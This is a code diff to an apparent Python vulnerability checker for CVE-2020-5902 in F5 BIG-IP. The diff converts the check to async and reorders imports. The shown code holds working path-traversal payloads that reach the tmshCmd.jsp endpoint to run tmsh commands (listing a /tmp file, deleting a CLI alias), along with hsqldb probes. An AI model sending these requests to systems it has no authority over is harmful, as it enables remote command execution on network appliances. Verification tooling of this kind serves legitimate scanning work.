@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
 import uuid
-from app.lib.utils.request import request
-from app.lib.utils.common import get_useragent
+from app.lib.common import get_useragent
+from app.lib.request import request
 
 class CVE_2020_5902_BaseVerify:
     def __init__(self, url):
@@ -26,7 +26,7 @@ class CVE_2020_5902_BaseVerify:
         self.list_payload = '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/%s' %(self.file)
         self.delete_payload = '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list'
 
-    def check(self):
+    async def check(self):
         
         """
         检测是否存在漏洞
@@ -35,16 +35,15 @@ class CVE_2020_5902_BaseVerify:
         :return bool True or False: 是否存在漏洞
         """
 
-        check_req = request.get(self.url + self.check_payload, headers = self.headers)
-        if 'password_policy_table' in check_req.text:
+        check_req = await request.get(self.url + self.check_payload, headers = self.headers)
+        if 'password_policy_table' in await check_req.text():
             return True
-        hsqldbRsp = request.get(self.url + '/hsqldb;', headers = self.headers)
-        if 'HSQL Database Engine' in hsqldbRsp.text and hsqldbRsp.status_code == 200:
+        hsqldbRsp = await request.get(self.url + '/hsqldb;', headers = self.headers)
+        if 'HSQL Database Engine' in await hsqldbRsp.text() and hsqldbRsp.status == 200:
             return True
-        hsqldbRsp1 = request.get(self.url + '/hsqldb%0a', headers = self.headers)
-        if 'HSQL Database Engine' in hsqldbRsp1.text and hsqldbRsp1.status_code == 200:
+        hsqldbRsp1 = await request.get(self.url + '/hsqldb%0a', headers = self.headers)
+        if 'HSQL Database Engine' in await hsqldbRsp1.text() and hsqldbRsp1.status == 200:
             return True
-        return False
 
 if  __name__ == "__main__":
     CVE_2020_5902 = CVE_2020_5902_BaseVerify('https://127.0.0.1')
